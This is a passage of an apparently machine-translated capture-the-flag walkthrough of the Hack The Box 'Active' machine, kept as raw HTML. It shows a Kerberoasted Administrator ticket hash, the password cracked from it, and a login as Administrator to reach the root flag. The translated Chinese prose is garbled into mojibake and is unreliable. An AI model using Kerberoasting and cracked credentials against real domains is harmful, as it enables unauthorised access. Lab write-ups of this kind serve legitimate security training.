mk">$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$bbf801bd55ba86f056215f3b48840548$61ece6a16beee9f8cbc4e581a6069d275f6ce178a438510dd3e0a381f3e3ca5b81b55867acd96e190920dc3d640ca0d0c2a83e2ac3788050d9d1efb2b09d33f665ea0dcf1c4717bd5d014c1eb4c6b0e557534a446fa6dbea2ba8b88e76412252899144c35b7cf9acfeeb960d4d8eb928921eed134edd8c95c5d8aafb34701608ed768bf1f66654e45f380ad579fa516dca50fbc8ac62396f47c11fb934662211e953a27aaf3ae1a316f0ec7323c8e1243dd463081d68c5c3496d8e0681266b453ab8f0f9859c816e987738afadd98c3de5c188e449243ad805b084b2b0d3bc3bfd5c17e12c0ee3bd2ac5f7075fc637d36dbb40899f83fdce659e292cdff3ab0e4f2fa97860e9b7baba585ea87bd801feb6ec942993806e4a8851f6a7a368270c1d39ed42012ee56714bcec6b5bd25cd5c967ee4329d7194004c03e21ea83ac0c40375c4255d9b084038d45f14646c608222f636bf7ab9ebbe5052e9f2fc0b4cd0f6a29799b1566fbd758a271a622743845057bfc040d135e232ad59472ca6e90b030f03dff06444fdffc3f82bd4171b87755134ff12b8df98d03cdbe53fd05d1023cff7b9c4abf9e844e635ce769069b91b63f37e0d9697c24390c39586db33ff26b5980b47142b29b2d050fb101350438e01435b02da4d65d89d01532caa768abb9f50fe5ea165db9bf857f6689776f7839b99bc1a4651adfb746b8d8a7d7dd95cd8c80c5d0aaf722270fbbedd8258662b85c289da626d4c357bdbd59c206960ad8bfc0419eb34a86c19cfe6e2dcfdc3cfb3c369e6dfc9503b564661a4ddec9d44ddc57c0b4a48acee355750fddfd39252e6b05693697f2660c007d119b0ee0ccb958c18281c6a067aa1169c2cbc65a49cff7c38e3af143fff259ade1560e754be4ccccff118175688785f267375572059f056aa22c91e23310e244b2ac95f83a1d5a4f9d39ac6378516149223e2cae4147495767a52224ce852d72608d64efc13306d9c24d8250726c80cea8d3ce08c9e3b94f6ba8801f6e5113e2d3732841701e2a5a24daef549ac08f5c86536543dfd524b6d6df659fdc9e36df15d900c946a44b32d4b22655c3b5ebf796b8e4fd75366129e908ae7ebce9a6934cec4e7657180f0dd1a87911fc51bf810afc05cea47b37f7a59519bf8fd8dc89444682678d20eba6c908bc3b3a9b0c70a028992df4ae689e0b4ebc2b748d409e3f837156c09514e16364d684ce582711c6bffd417d3d1fcd4452fc7bd973:<strong class="mc ir">Ticketmaster1968</strong></span></pre><p id="b42f" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨å‡­è¯<strong class="kn ir"> Administrator </strong>å’Œ<strong class="kn ir"> Ticketmaster1968 </strong>ç™»å½•ï¼Œå¹¶è®¿é—®å…±äº«ä»¥æ‰¾åˆ°æ ‡å¿—</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="06b8" class="mg jo iq mc b gy mh mi l mj mk"><strong class="mc ir">Users -&gt; Administrator -&gt; Desktop -&gt; root.txt</strong></span></pre><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi op"><img src="../Images/22874cb75cde11497655145c7d71b1e0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1394/format:webp/1*9hFS0ahuFL_9jH7zN1pCmw.png"/></div></figure><p id="433e" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated"><strong class="kn ir">å°±æ˜¯è¿™æ ·ï¼å¸Œæœ›ä½ ä»è¿™ç¯‡æ–‡ç« ä¸­å­¦åˆ°äº†ä¸€äº›ä¸œè¥¿ï¼æ„Ÿè°¢é˜…è¯»ï¼ğŸ‘</strong></p></div><div class="ab cl oq or hu os" role="separator"><span class="ot bw bk ou ov ow"/><span class="ot bw bk ou ov ow"/><span class="ot bw bk ou ov"/></div><div class="ij ik il im in"><p id="084d" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated"><em class="mt">å…³æ³¨</em> <a class="ae lv" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="mt"> InfosecæŠ¥é“</em> </a> <em class="mt">è·å–æ›´å¤šæ­¤ç±»ç²¾å½©æŠ¥é“ã€‚</em></p><div class="ng nh gp gr ni nj"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="nk ab fo"><div class="nl ab nm cl cj nn"><h2 class="bd ir gy z fp no fr fs np fu fw ip bi translated">ä¿¡æ¯å®‰å…¨æŠ¥é“</h2><div class="nq l"><h3 class="bd b gy z fp no fr fs np fu fw dk translated">æ”¶é›†äº†ä¸–ç•Œä¸Šæœ€å¥½çš„é»‘å®¢çš„æ–‡ç« ï¼Œä¸»é¢˜ä»bugå¥–é‡‘å’ŒCTFåˆ°vulnhubâ€¦</h3></div><div class="nr l"><p class="bd b dl z fp no fr fs np fu fw dk translated">medium.com</p></div></div><div class="ns l"><div class="ox l nu nv nw ns nx lp nj"/></div></div></a></div></div></div>    
</body>
</html>